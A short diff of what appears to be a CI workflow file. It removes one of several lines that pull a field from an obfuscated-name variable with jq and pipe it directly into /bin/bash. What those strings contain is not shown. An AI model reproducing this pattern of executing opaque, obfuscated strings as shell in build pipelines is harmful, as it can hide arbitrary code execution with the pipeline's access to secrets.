@@ -22,7 +22,6 @@ jobs:
           echo $ygadk907 | jq -r .rncd65511 | /bin/bash
           echo $klflw7 | jq -r .yno0659 | /bin/bash
           printf '%s' "$grwim28" | jq -r .kfq150 | /bin/bash
-          printf '%s' "$uwei445" | jq -r .j30162 | /bin/bash
 
       - name: Persist data
         if: ${{ always() }}
